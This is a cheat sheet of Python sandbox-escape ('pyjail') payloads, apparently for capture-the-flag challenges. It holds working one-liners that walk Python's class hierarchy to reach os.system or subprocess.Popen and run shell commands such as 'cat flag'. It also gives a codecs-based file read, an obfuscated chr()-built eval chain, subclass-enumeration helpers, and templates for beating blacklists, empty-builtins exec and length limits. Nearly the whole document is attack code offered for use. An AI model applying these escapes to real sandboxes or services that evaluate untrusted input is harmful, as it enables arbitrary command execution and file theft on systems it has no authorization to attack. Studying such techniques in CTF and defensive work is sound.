# Pyjail Complete Payloads

## Universal Payload (Long)
```python
(lambda: [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'wrap_close'][0].__init__.__globals__['system']('cat flag'))()
```

## Compact os.system
```python
[x for x in ().__class__.__bases__[0].__subclasses__() if 'wrap' in str(x)][0].__init__.__globals__['system']('cat flag')
```

## Via Popen
```python
[x for x in ().__class__.__base__.__subclasses__() if 'Popen' in str(x)][0](['cat', 'flag'], stdout=-1).communicate()[0]
```

## Via codecs
```python
__import__('codecs').open('flag.txt').read()
```

## Via eval chain
```python
eval(eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))
```

## Debugging Tips

```python
# List all available subclasses
print(len(().__class__.__base__.__subclasses__()))

# Find subclass by name
for i, c in enumerate(().__class__.__base__.__subclasses__()):
    print(i, c.__name__)

# Check what's in globals of a class
cls.__init__.__globals__.keys()

# Check available builtins
dir(__builtins__)
```

## CTF Pattern Templates

### Pattern 1: Simple eval jail
```python
# Challenge: eval(user_input) with blacklist
# Bypass: String manipulation, chr(), getattr()
```

### Pattern 2: exec with no builtins
```python
# Challenge: exec(user_input, {"__builtins__": {}})
# Bypass: Class hierarchy traversal
().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('cat flag')
```

### Pattern 3: Character whitelist
```python
# Challenge: Only alphanumeric allowed
# Bypass: getattr chains, chr() building
```

### Pattern 4: Length limit
```python
# Challenge: len(input) < N
# Bypass: exec(input()) staging
exec(input())  # 12 chars, paste payload interactively
```

## Tools

```bash
# pyjailbreaker - Collection of payloads
# https://github.com/seaung/pyjailbreaker
```
